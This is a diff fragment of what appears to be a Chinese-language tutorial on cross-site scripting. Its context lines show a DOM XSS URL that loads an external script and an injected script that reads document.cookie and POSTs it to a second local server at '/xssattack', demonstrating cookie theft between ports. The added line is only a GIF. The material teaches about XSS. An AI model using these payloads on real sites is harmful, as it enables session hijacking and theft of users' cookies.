@@ -20,3 +20,5 @@ http://127.0.0.1:8080/domTest.html#document.write("<script/src=//askybig.github.
 测试数据</h><script>(function () {var str = document.cookie;console.log('str', str);var request=new XMLHttpRequest();request.onreadystatechange=function(){if(request.readyState===4){if(request.status===200){console.log("success");return request}else{console.log("fail");return request}}else{}};request.open("POST","http://localhost:3001/xssattack");request.send(str);})()</script>
 ```
 可以看到3000 端口的 Cookie 被 3001 拿到了。
+
+![反射型](https://media.giphy.com/media/vFKqnCdLPNOKc/giphy.gif)
